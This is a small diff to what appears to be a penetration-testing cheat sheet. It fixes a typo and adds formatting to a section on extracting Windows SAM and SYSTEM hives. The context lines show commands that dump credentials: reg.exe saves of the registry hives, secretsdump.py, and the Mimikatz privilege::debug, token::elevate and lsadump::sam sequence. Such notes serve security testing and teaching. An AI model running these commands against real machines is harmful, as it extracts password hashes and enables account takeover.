@@ -70,7 +70,8 @@ https://lolbas-project.github.io/#
     %SYSTEMROOT%\System32\config\SYSTEM
     %SYSTEMROOT%\System32\config\RegBack\system 
 ### Extracting SAM and SYSTEM 
-Manualy or use [mimikatz](https://github.com/gentilkiwi/mimikatz) 
+Manually or use [mimikatz](https://github.com/gentilkiwi/mimikatz) 
+Manually:
 
      reg.exe save HKLM\SAM sam.bak 
      reg.exe save HKLM\SYSTEM system.bak 
@@ -78,6 +79,7 @@ Manualy or use [mimikatz](https://github.com/gentilkiwi/mimikatz)
      python3 /usr/local/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL 
 
 Mimikatz: 
+
      privilege::debug 
      token::elevate 
      lsadump::sam  
